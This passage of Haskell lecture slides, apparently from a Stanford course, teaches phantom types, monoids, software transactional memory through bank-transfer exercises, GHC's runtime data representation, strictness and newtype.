Trouble is, ``Data.Monoid`` already defined an instance for ``Maybe a``.

``FlexibleInstances`` allows these two *definitions* to coexist happily.

But when we want to *use* an instance, GHC doesn't know which one to
use!

.. _overlapping-instances-1:

Overlapping instances
=====================

Enter the ``OverlappingInstances`` pragma: 

.. code:: haskell

   {-# LANGUAGE FlexibleInstances, OverlappingInstances #-}

This allows multiple instances to coexist *and* be used.

The most specific instance that is visible will be used.

A very handy extension!

-  Also a big semantic gun pointing at your foot.

Problems with overlapping instances
===================================

Why worry about ``OverlappingInstances``? 

-  Makes it very easy for incorrect programs to still typecheck.

-  Can cause confusing error messages.

-  A program that typechecks can have its meaning changed by adding an
   instance declaration in some remote module.

On the plus side, you can `publish papers about their problems <http://web.cecs.pdx.edu/~jgmorris/pubs/morris-icfp2010-instances.pdf>`__,
so they're not bad for an academic career.

Checking in
===========

We have a ``Monoid`` instance that: 

-  Has a janky API

-  Uses a dodgy language extension

Can we do better? 

Phantom types
=============

Let's add a type parameter on the left hand side of our ``Payload``
type.

.. code:: haskell

   data Payload a = NoPayload
                  | Raw ContentType String
                  | Params [Param]
                  | FormData [Part]
                  deriving (Show)

The type variable ``a`` *does not appear in the RHS*.

We call this a *phantom type*.

What's it for?

A tiny upload API
=================

.. code:: haskell

   param :: String -> String -> Payload [Param]
   param name value = Params [(name, value)]

.. code:: haskell

   filePart :: String -> FilePath -> IO (Payload [Part])
   filePart name path = do
     body <- readFile name
     return (FormData [Part name (Just path) Nothing body])

Consider the types
==================

.. code:: haskell

   param :: String -> String
         -> Payload [Param]

   filePart :: String -> FilePath
            -> IO (Payload [Part])

Notice:

-  The first function returns a ``Payload [Param]``

-  The second returns a ``Payload [Part]``

The phantom parameter makes these *distinct types*.

-  The runtime representation is the same in each case.

-  The compiler prevents us from mixing the two by accident.

Code moment
===========

Please write a body for ``addParams`` below.

.. code:: haskell

   instance Monoid (Payload [Param]) where
       mempty = NoPayload
       mappend = addParams

Download the code you'll need:

::

   curl -L http://cs240h.scs.stanford.edu/PayloadPhantom.hs

You have five minutes.

Making this all work
====================

We have a constrained public API for creating ``Payload`` values.

.. code:: haskell

   param :: String -> String -> Payload [Param]

   filePart :: String -> FilePath -> IO (Payload [Part])

   fileString :: String -> Maybe FilePath -> String -> (Payload [Part])

How do we enforce this?

We export the *name* of the type ``Part``, but *not any of its
constructors*.

Exporting a type
================

The ``(..)`` notation below means "export the type ``Part`` and all of
its constructors".

.. code:: haskell

   module PayloadPhantom
       (
         Part(..)
       {- ... trimmed out ... -}
       ) where

.. _exporting-a-type-1:

Exporting a type
================

The ``(..)`` notation below means "export the type ``Part`` and all of
its constructors".

.. code:: haskell

   module PayloadPhantom
       (
         Part(..)
       {- ... trimmed out ... -}
       ) where

Notice that we omit the ``(..)`` below, meaning "export the type
``Payload``, but *not any of its constructors*".

.. code:: haskell

   module PayloadPhantom
       (
         Part(..)
       , Payload -- no constructors
       {- ... trimmed out ... -}
       ) where

.. _exporting-a-type-2:

Exporting a type
================

The ``(..)`` notation below means "export the type ``Part`` and all of
its constructors".

.. code:: haskell

   module PayloadPhantom
       (
         Part(..)
       {- ... trimmed out ... -}
       ) where

So we export the ``Payload`` type, and *only* the functions that we
defined and control ("smart constructors") that construct values of this
type.

.. code:: haskell

   module PayloadPhantom
       (
         Part(..)
       , Payload -- no constructors
       , param
       , filePart
       , fileString
       {- ... trimmed out ... -}
       ) where

Trying it out
=============

In ``ghci``: 

::

   ghci> param "foo" "bar" <> param "baz" "quux"
   Params [("foo","bar"),("baz","quux")]

This uses my favourite operator from ``Data.Monoid``: 

.. code:: haskell

   (<>) :: Monoid m => m -> m -> m
   (<>) = mappend

What do we get if we try this? 

.. code:: haskell

   param "foo" "bar" <> fileString "baz" Nothing "quux"

Last of the monoids
===================

For which of the following should we write ``Monoid`` instances?

.. code:: haskell

   data Payload a = NoPayload
                  | Raw ContentType String
                  | Params [Param]
                  | FormData [Part]
                  deriving (Show)

Why care so much about monoids?
===============================

Monoids have many merits: 

-  Simple

-  Easy for clients to use

-  Force you to address API design problems early on

Monoids without an identity
===========================

Like the abstract algebraic approach? 

A package on Hackage named ``semigroups`` gives us monoids *without* an
identity operation: semigroups.

Alas:

-  The ``Monoid`` type was developed before the ``semigroups`` package

-  The two should be related, but thanks to this accident of history are
   not

Principles
==========

Why care about phantom types and monoids? 

-  We want to build the simplest correct libraries we can

Monoids help us focus on simplicity.

Phantom types make it easier to build APIs where flat-out broken
behaviours can be made impossible by the compiler.

Mutable variables
=================

We've already seen the very handy ``MVar`` type, which represents a
"blocking mutable box": we can put a value in or take one out, but we'll
block if we put when full or take when empty.

Even though ``MVar`` s are the fastest blocking concurrent structure in
the industry (they made the the Kessel Run in less than twelve
parsecs!), we don't always want blocking semantics.

For cases where we want *non-* blocking updates, there's the ``IORef``
type, which gives us mutable references.

.. code:: haskell

   import Data.IORef

   newIORef    :: a -> IO (IORef a)

   readIORef   :: IORef a -> IO a
   writeIORef  :: IORef a -> a -> IO ()

   modifyIORef :: IORef a -> (a -> a) -> IO ()

Managing mutation
=================

Application writers are often faced with a question like this:

-  I have a big app, and parts of it need their behaviour tweaked by an
   administrator at runtime.

There are of course many ways to address this sort of problem.

Let's consider one where we use a reference to a piece of config data.

Any code that's executing in the ``IO`` monad can, if it knows the name
of the config reference, retrieve the current config:

.. code:: haskell

   curCfg <- readIORef cfgRef

The trouble is, ill-behaved code could clearly also *modify* the current
configuration, and leave us with a debugging nightmare.

Phantom types to the rescue!
============================

Let's create a new type of mutable reference.

We use a phantom type ``t`` to statically track whether a piece of code
is allowed to modify the reference or not.

.. code:: haskell

   import Data.IORef

   newtype Ref t a = Ref (IORef a)

Remember, our use of ``newtype`` here means that the ``Ref`` type only
exists at compile time: it imposes *no* runtime cost.

Since we are using a phantom type, we don't even need values of our
access control types:

.. code:: haskell

   data ReadOnly
   data ReadWrite

We're already in a good spot! Not only are we creating compiler-enforced
access control, but it will have *zero* runtime cost.

Creating a mutable reference
============================

To create a new reference, we just have to ensure that it has the right
type.

.. code:: haskell

   newRef :: a -> IO (Ref ReadWrite a)
   newRef a = Ref `fmap` newIORef a

Reading and writing a mutable reference
=======================================

Since we want to be able to read both read-only and read-write
references, we don't need to mention the access mode when writing a type
signature for ``readRef``.

.. code:: haskell

   readRef :: Ref t a -> IO a
   readRef (Ref ref) = readIORef ref

Of course, code can only write to a reference if the compiler can
statically prove (via the type system) that it has write access.

.. code:: haskell

   writeRef :: Ref ReadWrite a -> a -> IO ()
   writeRef (Ref ref) v = writeIORef ref v

Converting a reference to read-only
===================================

This function allows us to convert any kind of reference into a
read-only reference:

.. code:: haskell

   readOnly :: Ref t a -> Ref ReadOnly a
   readOnly (Ref ref) = Ref ref

In order to prevent clients from promoting a reference from read-only to
read-write, we do *not* provide a function that goes in the opposite
direction.

We also use the familiar technique of constructor hiding at the top of
our source file:

.. code:: haskell

   module Ref
       (
         Ref, -- export type ctor, but not value ctor
         newRef, readOnly,
         readRef, writeRef
       ) where

Further reading
===============

A *really* good read: 

-  `Data analysis with monoids <http://twdkz.wordpress.com/2013/05/31/data-analysis-with-monoids/>`__

Monoids for MapReduce: 

-  `Google’s MapReduce Programming Model---Revisited <http://userpages.uni-koblenz.de/~laemmel/MapReduce/paper.pdf>`__


/L6 Memory
===========

MVars revisited
===============

-  Exercise: Write transfer function to move money between accounts

   -  ``wget``
      ```cs240h.stanford.edu/transfer.hs`` <http://cs240h.scs.stanford.edu/transfer.hs>`__

   .. code:: haskell

      import Control.Concurrent
      import Control.Monad

      type Account = MVar Double

      transfer :: Double -> Account -> Account -> IO ()
      transfer amount from to = ???

   -  Should work atomically with multiple threads
   -  E.g., other threads should never see money in neither account or
      both accounts
   -  Don’t transfer money if insufficient funds in account

-  Example:

   ::

      *Main> :load "transfer.hs"
      Ok, modules loaded: Main.
      *Main> main
      9.0
      1.0

First attempt at solution
=========================

.. code:: haskell

   type Account = MVar Double

   transfer :: Double -> Account -> Account -> IO ()
   transfer amount from to =
     modifyMVar_ from $ \bf -> do
       when (bf < amount) $ fail "not enough money"
       modifyMVar_ to $ \bt -> return $! bt + amount
       return $! bf - amount

-  What’s wrong with the above code?

.. _first-attempt-at-solution-1:

First attempt at solution
=========================

.. code:: haskell

   type Account = MVar Double

   transfer :: Double -> Account -> Account -> IO ()
   transfer amount from to =
     modifyMVar_ from $ \bf -> do
       when (bf < amount) $ fail "not enough money"
       modifyMVar_ to $ \bt -> return $! bt + amount
       return $! bf - amount

-  What’s wrong with the above code?

   1. Can deadlock when simultaneously transferring money in both
      directions

      .. code:: haskell

         forkIO $ transfer 1 ac1 ac2
         forkIO $ transfer 1 ac2 ac1

   2. Throwing an exception when not enough money is ugly… what if we
      just waited for enough money to show up before completing the
      transfer?

-  How would you fix #1?

Second attempt at solution
==========================

-  Strategy: Use non-blocking
   ```tryTakeMVar`` <http://www.haskell.org/ghc/docs/latest/html/libraries/base-4.7.0.0/Control-Concurrent-MVar.html#v:tryTakeMVar>`__
   for second ``MVar``

   -  If it fails, release both and try again in different order

.. code:: haskell

   transfer :: Double -> Account -> Account -> IO ()
   transfer amount from to = do
     let tryTransfer = modifyMVar from $  bf -> do
           when (bf < amount) $ fail "not enough money"
           mbt <- tryTakeMVar to
           case mbt of
             Just bt -> do putMVar to $! bt + amount
                           return (bf - amount, True)
             Nothing -> return (bf, False)
     ok <- tryTransfer
     unless ok $ safetransfer (- amount) to from

-  Is this gross enough for you yet?

   -  If not, make the code sleep when not enough funds are present in
      ``from``
   -  … or fix it to handle asynchronous exceptions properly

.. _software-transactional-memorystm:

`Software transactional memory <http://hackage.haskell.org/package/stm>`__
==========================================================================

-  What if instead we used database-like transactions?

   -  Read and write a bunch of variables
   -  Writes initially go to log, then get committed atomically at end
   -  Did you get an inconsistent view or clash with another update? No
      problem, just abort and retry the whole transaction

-  Would be hard to do in C or Java

   -  What if you wrote to the network or file system during
      transaction?
   -  “Externalized” actions can’t easily be rolled back

-  But in Haskell, the ``IO`` type (or lack thereof) can control side
   effects

-  Slides inspired by good write-up in `[Peyton
   Jones] <http://research.microsoft.com/en-us/um/people/simonpj/papers/stm/beautiful.pdf>`__

STM basics
==========

-  New variable type ``TVar a`` (kind of like an
   ```IORef a`` <http://www.haskell.org/ghc/docs/latest/html/libraries/base-4.7.0.0/Data-IORef.html>`__)

   -  Module
      ```Control.Concurrent.TVar`` <http://hackage.haskell.org/package/stm-2.4.3/docs/Control-Concurrent-STM-TVar.html>`__
      gives you

   .. code:: haskell

      newTVarIO   :: a -> IO (TVar a)
      readTVarIO  :: TVar a -> IO a

      readTVar    :: TVar a -> STM a
      writeTVar   :: TVar a -> a -> STM ()
      modifyTVar  :: TVar a -> (a -> a) -> STM ()  -- lazy
      modifyTVar' :: TVar a -> (a -> a) -> STM ()  -- strict

-  New ```STM``
   monad <http://hackage.haskell.org/package/stm-2.4.3/docs/Control-Monad-STM.html>`__
   allows ``TVar`` access but no irreversible side effects

   .. code:: haskell

      atomically :: STM a -> IO a

   -  ``atomically`` lets you run ``STM`` computations from ``IO``
   -  You get: semantics of one global lock + parallelism of
      fine-grained locks!
   -  In exchange, you give up the ability to perform externalized
      ``IO`` actions

STM Example
===========

.. code:: haskell

   type Account = TVar Double

   transfer :: Double -> Account -> Account -> STM ()
   transfer amount from to = do
     modifyTVar' from (subtract amount)
     modifyTVar' to (+ amount)

   main :: IO ()
   main = do
     ac1 <- newTVarIO 10
     ac2 <- newTVarIO 0
     atomically $ transfer 1 ac1 ac2

-  Note: ``subtract a b = b - a``

   -  Language wart: Unlike all other binary operators, can’t make
      section with ``(- a)`` because that’s unary negation (i.e.,
      ``0-a``)

-  What if you want to wait when not enough money in account?

Aborting
========

.. code:: haskell

   retry :: STM a
   orElse :: STM a -> STM a -> STM a

-  ``retry`` aborts the transaction

   -  But ``STM`` knows what ``TVar`` s code read to detect conflicts…
   -  Can sleep until some ``TVar`` code read changes w/o explicit
      condition variables

   .. code:: haskell

      transfer :: Double -> Account -> Account -> STM ()
      transfer amount from to = do
        bf <- readTVar from
        when (amount > bf) retry
        modifyTVar' from (subtract amount)
        modifyTVar' to (+ amount)

-  ``orElse`` tries second action if first one aborts (sleeps if both
   abort)

   .. code:: haskell

      transfer2 :: Double -> Account -> Account -> Account -> STM ()
      transfer2 amount from1 from2 to =
        atomically $ transferSTM amount from1 to
                     `orElse` transferSTM amount from2 to

   -  Effectively provides nested transactions

Enforcing invariants
====================

.. code:: haskell

   alwaysSucceeds :: STM a -> STM ()

-  ``alwaysSucceeds`` adds invariant to check after every transaction
   (Either the invariant throws an exception or its return value
   ignored)

-  Example: say you are paranoid about negative account balances

.. code:: haskell

   newAccount :: Double -> STM Account
   newAccount balance = do
     tv <- newTVar balance
     alwaysSucceeds $ do balance <- readTVar tv
                         when (balance < 0) $ fail "negative balance"
     return tv

   bogus :: IO ()
   bogus = do
     ac <- atomically $ newAccount 10
     atomically $ modifyTVar ac (subtract 15)

-  Will catch errors immediately at end of & roll back faulty
   transactions

::

   *Main> bogus
   *** Exception: negative balance

Switching gears…
================

-  Let’s get back to pure functional code

-  How does the compiler represent data in memory?

Naïve Haskell data representation
=================================

-  A value requires a constructor, plus arguments

   -  At runtime, need to determine a value’s constructor, but not it’s
      type (Compiler already type-checked program, so no runtime type
      checks)

   .. code:: c

      struct Val {
        unsigned long constrno; /* constructor # */
        struct Val *args[];     /* flexible array */
      };

   -  For a type like ``[Int]``, ``constrno`` might be 0 for ``[]`` and
      1 for ``(:)``, where ``[]`` has 0-sized ``args`` and ``(:)`` has
      2-element ``args``
   -  For a type like ``Int``, ``constrno`` can be the actual integer,
      with no ``args``
   -  For a single-constructor type (e.g., ``Point``) ``constrno`` not
      used

-  Problems with our approach so far

   -  No way to represent exceptions or thunks
   -  Garbage collector needs to know how many elements are in ``args``
   -  Small values such as ``Int`` s always require chasing a pointer

Add level of indirection to describe values
===========================================

.. code:: c

   typedef struct Val {
     const struct ValInfo *info;
     struct Val *args[];
   } Val;

   /* Statically allocated at compile time.  Only one per
    * constructor (or closure-creating expression, etc.) */
   struct ValInfo {
     struct GCInfo gcInfo;  /* for garbage collector */
     enum { CONSTRNO, FUNC, THUNK, IND } tag;
     union {
       unsigned int constrno;
       Val *(*func) (const Val *closure, const Val *arg);
       Exception *(*thunk) (Val *closure);
     };
   };

-  ``gcInfo`` says how many ``Val *`` s are in ``args`` and where they
   are
-  ``tag == CONSTRNO`` means ``constrno`` valid, used as on last slide
-  ``tag == IND`` means ``args[0]`` is an indirect *forwarding pointer*
   to another ``Val`` and union is unused; useful if size of ``args``
   grows

Function values
===============

-  A ``Val`` whose ``ValInfo`` has ``tag == FUNC`` uses the ``func``
   field

   .. code:: c

          Val *(*func) (const Val *closure, const Val *arg);

-  To apply function ``f`` to argument ``a`` (where both are type
   ``Val *``):

   .. code:: c

              f->info->func (f, a);

-  Note that ``func`` ’s first argument (``closure``) is the function
   ``Val`` itself

   -  Provides a *closure* environment so ``ValInfo``/``func`` can be
      re-used

-  ``func`` ’s second argument (``arg``) is the argument ``a`` on which
   the function is being evaluated

-  Assume all functions take one argument

   -  Logically this is fine since we have currying
   -  For performance, real compilers must optimize multi-argument case

Closures
========

-  Top-level bindings don’t need the ``closure`` argument to ``func``

   .. code:: haskell

      addOne :: Int -> Int
      addOne x = x + 1

   -  The ``Val`` for function ``addOne`` can have zero-length ``args``

-  Local bindings may need environment values in ``closure``

   .. code:: haskell

      add :: Int -> (Int -> Int)
      add n = \m -> addn m
          where addn m = n + m

   -  Compiler will only emit code for local function ``addn`` once
   -  But logically, there is a separate ``addn`` function (with a
      different ``n``) for each invocation of ``add``
   -  So each ``addn`` instance is a different ``Val``, but all share
      the same ``ValInfo``
   -  Use ``args[0]`` in each ``Val`` to specify the value of ``n``

Thunk values
============

-  A ``Val`` with ``tag == THUNK`` uses the ``thunk`` field in
   ``ValInfo``

   .. code:: c

          Exception *(*thunk) (Val *closure);

   -  *Updates* ``v`` (turns it into non-thunk) or returns a
      non-``NULL`` ``Exception *``

-  To evaluate a thunk:

   .. code:: c

              v->info->thunk (v);

-  Two big differences between thunks and functions

   -  A function takes an argument, while a thunk does not
   -  A function value is immutable, while a thunk updates itself

-  Note also that a thunk may throw an exception

   -  Functions can, too, but for simplicity let’s implement it by
      having the function return a thunk that throws an exception

Forcing
=======

-  Turning a thunk into a non-thunk is known as *forcing* it

-  What if a thunk’s return value doesn’t fit in thunk’s ``args``?

   -  This is why we have the ``IND`` ``ValInfo`` tag–Allocate new
      ``Val``, place indirect forwarding pointer in old ``Val``

-  A possible implementation of forcing that walks ``IND`` pointers:

   .. code:: c

      Exception *force (Val **vp)
      {
        for (;;) {
          if ((*vp)->info->tag == IND)
            *vp = (*vp)->arg[0];
          else if ((*vp)->info->tag == THUNK) {
            Exception *e = (*vp)->info->thunk (*vp);
            if (e)
              return e;
          }
          else
            return NULL;
        }
      }

Currying
========

-  Let’s use simple implementation of currying (GHC very complex)

-  Set ``closure->args`` to head of list of previously curried args

   .. code:: haskell

      const3 :: a -> b -> c -> a
      const3 a b c = a

   -  Compiler emits 3 ``ValInfo`` s and 3 functions for ``const3``
   -  Top-level binding’s ``ValInfo`` has ``func = const3_1``
   -  ``const3_1`` creates ``Val v1`` where ``arg[0]`` is first argument
      (``a``) and ``info->func = const3_2``
   -  ``const3_2`` creates a ``Val v2`` where ``arg[0]`` is the second
      argument (``b``), ``arg[1]`` is ``v1``, and ``info->func`` is
      ``const3_3``
   -  ``const3_3`` has access to all arguments and actually implements
      ``const3``

-  Shared arguments have common arg tails, only evaluated once

   .. code:: haskell

          let f = const3 (superExpensive 5) -- v1, evaluated once
          in (f 1 2, f 3 4)

Code for currying example
=========================

.. code:: haskell

   const3 :: a -> b -> c -> a
   const3 a b c = a

.. code:: c

   Val *const3_1 (Val *ignored, Val *a)
   {
     v = (Val *) gc_malloc (offsetof (Val, args[1]));
     v->info = &const3_2_info;  /* func = const3_2 */
     v->args[0] = a;
     return v;
   }

   Val *const3_2 (Val *closure, Val *b)
   {
     v = (Val *) gc_malloc (offsetof (Val, args[2]));
     v->info = &const3_3_info;  /* func = const3_3 */
     v->args[0] = b;
     v->args[1] = closure;
     return v;
   }

   Val *const3_3 (Val *v, Val *c)
   {
     return v->args[1]->args[0];
   }

Unboxed types
=============

-  Unfortunately, now ``Int`` has even more overhead

   -  To use, must check ``i->info->tag`` then access
      ``i->info->constr``
   -  Moreover, each number needs a distinct ``ValInfo`` structure (but
      ``ValInfo`` s statically allocated–how do you know what numbers
      the program will need)

-  Idea: Have special *unboxed* types that don’t use ``struct Val``

   .. code:: c

      union Arg {
        struct Val *boxed;     /* most values are boxed */
        unsigned long unboxed; /* "primitive" values */
      };

      typedef struct Val {
        const struct ValInfo *info;
        union Arg args[];      /* args can be boxed or unboxed */
      } Val;

   -  Unboxed types have no constructor and cannot be thunks (no
      ``ValInfo``)
   -  Can fit in a single register or take the place of a ``Val *`` arg
   -  Must extend ``GCInfo`` to identify which args are and are not
      boxed

Unboxed types in GHC
====================

-  GHC exposes unboxed types (even though not part of Haskell)

   -  Symbols use ``#`` character–must enable with
      ```-XMagicHash`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/syntax-extns.html#magic-hash>`__
      option
   -  Have unboxed types (``Int#``) and primitive operations on them
      (``+#``)
   -  See
      `GHC.Prim <http://www.haskell.org/ghc/docs/latest/html/libraries/ghc-prim-0.3.1.0/GHC-Prim.html>`__
      or type “``:browse GHC.Prim``” in GHCI
   -  Also have `unboxed
      constants <http://www.haskell.org/ghc/docs/latest/html/users_guide/syntax-extns.html#magic-hash>`__–``2#``,
      ``'a'#``, ``2##`` (unsigned), ``2.0##``

-  What is ``Int`` really?

   -  Single-constructor data type, with a single, unboxed argument

   ::

      Prelude> :set -XMagicHash
      Prelude> :m +GHC.Types GHC.Prim
      Prelude GHC.Types GHC.Prim> :i Int
      data Int = I# Int#      -- Defined in GHC.Types
      ...
      Prelude GHC.Types GHC.Prim> case 1 of I# u -> I# (u +# 2#)
      3

   -  Lets ``Int`` contain thunk, but avoids pointer dereference once
      evaluated

Restrictions on unboxed types
=============================

-  Cannot instantiate type variables with unboxed types

   .. code:: haskell

      {-# LANGUAGE MagicHash #-}
      import GHC.Prim

      data FastPoint = FastPoint Double# Double#  -- ok
      fp = FastPoint 2.0## 2.0##                  -- ok

      -- Error: can't pass unboxed type to polymorphic function
      fp' = FastPoint 2.0## (id 2.0##)

      -- Error: can't use unboxed type as type parameter
      noInt :: Maybe Int#
      noInt = Nothing

-  Enforced by making unboxed types a different kind of type

   ::

      Prelude GHC.Types GHC.Prim> :kind Int#
      Int# :: #

   -  Recall type variables have kinds with stars (∗, ∗ → ∗, etc.),
      never ``#``

   -  Polymorphism works because all types of kind ∗ represented as
      ``Val *``

``seq`` revisited
=================

-  Recall ``seq :: a -> b -> b``

   -  If ``seq a b`` is forced, then first ``a`` is forced, then ``b``
      is forced and returned

-  Consider the following code (similar to concurrency lecture):

   .. code:: haskell

      infiniteLoop = infiniteLoop :: Char   -- loops forever

      seqTest1 = infiniteLoop `seq` "Hello" -- loops forever

      seqTest2 = str `seq` length str       -- returns 6
          where str = infiniteLoop:"Hello"

   -  ``seqTest1`` hangs forever, while ``seqTest2`` happily returns 6

-  ``seq`` only forces a ``Val``, not the ``arg`` fields of the ``Val``

   -  ``seqTest2`` ’s ``seq`` forces ``str`` ’s constructor ``(:)``,
      but not the head or tail
   -  This is known as putting ``str`` in *Weak Head Normal Form* (WHNF)
   -  Can’t fully evaluate an arbitrary data type (but see
      `Control.DeepSeq <http://hackage.haskell.org/packages/archive/deepseq/latest/doc/html/Control-DeepSeq.html>`__)

Example: hypothetical ``seq`` implementation
============================================

.. code:: c

   const struct ValInfo seq_info = {
     some_gcinfo, THUNK, .thunk = &seq_thunk
   };

   Val *seq_2 (Val *closure, Val *b)
   { /* assume seq_1 put first arg of (seq a b) in closure */
     c = (Val *) gc_malloc (offsetof (Val, args[2]));
     c->info = &seq_info;
     c->args[0] = closure->args[0];
     c->args[1] = b;
     return c;
   }

   Exception *seq_thunk (Void *c)
   {
     Exception *e = force (&c->args[0]);
     if (!e) {
       c->info = &ind_info;     /* ValInfo with tag = IND */
       c->args[0] = c->args[1]; /* forward to b */
     }
     return e;
   }

Strictness revisited
====================

-  Recall strictness flag on fields in data declarations

   .. code:: haskell

      data IntWrapper = IntWrapper !Int

   -  ``Int`` has ``!`` before it, meaning it must be strict
   -  Strict means the ``Int`` ’s ``ValInfo`` cannot have ``tag``
      ``THUNK`` or ``IND``

-  Accessing a strict ``Int`` touches only one cache line

   -  Recall ``data Int = I# Int#`` has only one constructor

   -  Plus strict flag means ``tag == CONSTRNO``, so know what’s in
      ``ValInfo``

   -  Plus ``Int#`` is unboxed

   -  Thus, once ``IntWrapper`` forced, immediately safe to access
      ``Int`` as

      .. code:: c

             myIntWrapper.arg[0].boxed->arg[0].unboxed

Semantic effects of strictness
==============================

-  Strictness is primarily used for optimization

   -  To avoid building up long chains of thunks
   -  To save overhead of checking whether thunk evaluated

-  But has semantic effects: A non-strict ``Int`` is not just a number

   -  Can also throw an exception or loop forever when evaluated
   -  Such behavior can be modeled as a special value :math:`\bot`
      (“bottom”)
   -  So the values of ``Int`` are :math:`\{0,1\}^{64} \cup \{\bot\}`
   -  Types that include value :math:`\bot` are called *lifted*

-  Note 1: an unboxed type is necessarily unlifted

-  Note 2: ``!Int`` not a first-class type, only valid for ``data``
   fields

   .. code:: haskell

      data SMaybe a = SJust !a | SNothing   -- ok, data field
      strictAdd :: !Int -> !Int -> !Int     -- error
      type StrictMaybeInt = Maybe !Int      -- error

``case`` statements revisited
=============================

-  ``case`` statement pattern matching can force thunks

   -  An *irrefutable* pattern is one that always matches
   -  A pattern consisting of a single variable or ``_`` is irrefutable
   -  Any non-irrefutable pattern forces evaluation of the argument
   -  Matching happens top-to-bottom, and left-to-right within
      alternatives

-  Function pattern matching is the same as (desuggared into) ``case``

   -  Recall ``undefined :: a`` is ``Prelude`` symbol with value
      :math:`\bot`

   .. code:: haskell

      f ('a':'b':rest) = rest
      f _              = "ok"
      test1 = f (undefined:[])   -- error
      test2 = f ('a':undefined)  -- error
      test3 = f ('x':undefined)  -- "ok" (didn't force tail)

-  Adding ``~`` before a pattern makes it irrefutable

   .. code:: haskell

      three = ( ~(h:t) -> 3) undefined  -- evaluates to 3

``newtype`` declarations
========================

-  We’ve seen two ways to introduce new types

   -  ``data`` – creates a new (boxed) type, adding overhead of a
      ``Val`` wrapper
   -  ``type`` – creates an alias for an existing type, with no overhead

-  Sometimes you want a new type implemented by an existing type

   -  E.g., might want ``Meters``, ``Seconds``, ``Grams``, all
      implemented by ``Double``
   -  Using ``type`` would make them all synonymous, facilitating errors
   -  Might want different instances of ``Show`` for each, impossible
      with ``type``
   -  Could say ``data Meters = Meters Double`` – but will add overhead

-  The ``newtype`` keyword introduces new type with no overhead

   -  Use just like ``data``, but limited to one constructor and one
      field
   -  This is possible because all type-checking is compile-time

``newtype`` semantics
=====================

-  What’s the semantic difference between these two declarations?

   .. code:: haskell

      newtype NTInt = NTInt Int deriving (Show)

   .. code:: haskell

      data SInt = SInt !Int deriving (Show)

-  Exercise: Suppose you have

   .. code:: haskell

      uNTInt = NTInt undefined
      uSInt = SInt undefined

   Write code that behaves differently for ``uNTInt`` vs. ``uSInt``

.. _newtype-semantics-1:

``newtype`` semantics
=====================

-  What’s the semantic difference between these two declarations?

   .. code:: haskell

      newtype NTInt = NTInt Int deriving (Show)

   .. code:: haskell

      data SInt = SInt !Int deriving (Show)

-  The ``NTInt`` constructor is a “fake” compile-time-only construct

   -  A case statement deconstructing a ``newtype`` compiles to nothing

   .. code:: haskell

      newtype NTInt = NTInt Int deriving (Show)
      uNTInt = NTInt undefined
      testNT = case uNTInt of NTInt _ -> True   -- returns True

   -  Conversely, forcing a value (by matching constructor) forces
      strict fields

   .. code:: haskell

      data SInt = SInt !Int deriving (Show)
      uSInt = SInt undefined
      testS = case uSInt of SInt _ -> True      -- undefined

.. _the-unpackunpack-pragma:

The UNPACK pragma
=================

http://www.haskell.org/ghc/docs/latest/html/users_guide/pragmas.html#unpack-pragma

-  ``newtype`` almost always better than ``data`` when it applies

-  What about a multi-field data type?

   .. code:: haskell

      data TwoInts = TwoInts !Int !Int

   -  Fields are strict, we know they’ll have ``CONSTRNO`` ``ValInfo``

   -  Why not stick the ``Int#`` s directly into the ``args`` of a
      ``TwoInts`` ``Val``?

   -  GHC provides an ``UNPACK`` pragma to do just this

      .. code:: haskell

         data TwoInts = TwoInts {-# UNPACK #-} !Int {-# UNPACK #-} !Int

   -  Works for any strict field with a single-constructor datatype

-  Unlike ``newtype``, ``UNPACK`` is not always a win

   -  If you pass field as argument, will need to re-box it

-  ``-funbox-strict-fields`` flag unpacks *all* strict fields

.. raw:: html

   <!--


   # User-managed memory

   * Opaque type [`Ptr a`][Ptr] represents pointers to type `a`
       * Pointers are not typesafe--allow pointer arithmetic and casting

           ~~~~ {.haskell}
           nullPtr :: Ptr a
           plusPtr :: Ptr a -> Int -> Ptr b
           minusPtr :: Ptr a -> Ptr b -> Int
           castPtr :: Ptr a -> Ptr b
           ~~~~

       * Pointer arithmetic is always in units of bytes (unlike in C,
         where unit is size of the pointed-to object)
   * Class [`Storable`][Storable] provides raw access to memory using
     `Ptr`s

       ~~~~ {.haskell}
       class Storable a where
           sizeOf :: a -> Int
           alignment :: a -> Int
           peek :: Ptr a -> IO a
           poke :: Ptr a -> a -> IO ()
           ...
       ~~~~

       * Most basic types (`Bool`, `Int`, `Char`, `Ptr a`, etc.) are `Storable`

   # `alloca`

   * Easiest way to get a valid `Ptr` is `alloca`:

       ~~~~ {.haskell}
       alloca :: Storable a => (Ptr a -> IO b) -> IO b
       ~~~~

       * Allocates enough space for an object of type `a`
       * Calls function with a `Ptr` to the space
       * Reclaims the memory when the function returns (much like C
         `alloca`)
       * Can also ask for a specific number of bytes:

       ~~~~ {.haskell}
       allocaBytes :: Int -> (Ptr a -> IO b) -> IO b
       ~~~~

   * `Foreign` module provides handy [`with`][with] utility

       ~~~~ {.haskell}
       with :: Storable a => a -> (Ptr a -> IO b) -> IO b
       with val f  =
         alloca $ \ptr -> do
           poke ptr val
           res <- f ptr
           return res
       ~~~~


   # More `Storable` types

   * `Foreign.C` contains wrappers for C types
       * `CInt`, `CUInt`, `CChar`, `CDouble`, `CIntPtr` etc.
   * `Data.Int` and `Data.Word` have all sizes of machine integer
       * `Int8`, `Int16`, `Int32`, `Int64` -- signed integers
       * `Word8`, `Word16`, `Word32`, `Word64` -- unsigned integers

   * Example: extract all the bytes from a `Storable` object

       ~~~~ {.haskell}
       toBytes :: (Storable a) => a -> [Word8]
       toBytes a = unsafePerformIO $
           with a $ \pa -> go (castPtr pa) (pa `plusPtr` sizeOf a)
           where go p e | p < e = do b <- peek p
                                     bs <- go (p `plusPtr` 1) e
                                     return (b:bs)
                        | otherwise = return []
       ~~~~

       * `unsafePerformIO` might be okay here since `toBytes` pure
       * Notice how `plusPtr` lets us change from `Ptr a` to `Ptr Word8`

   # `malloc` and `mallocForeignPtr`

   * Can also allocate longer-lived memory with `malloc`

       ~~~~ {.haskell}
       malloc :: Storable a => IO (Ptr a)
       mallocBytes :: Int -> IO (Ptr a)
       free :: Ptr a -> IO ()
       realloc :: Storable b => Ptr a -> IO (Ptr b)
       reallocBytes :: Ptr a -> Int -> IO (Ptr a)
       ~~~~

       * Disadvantage:  bad programming can lead to memory
         leaks/corruption

   * `ForeignPtr` lets you delegate deallocation to garbage collector

       ~~~~ {.haskell}
       mallocForeignPtr :: Storable a => IO (ForeignPtr a)
       mallocForeignPtrBytes :: Int -> IO (ForeignPtr a)
       ~~~~
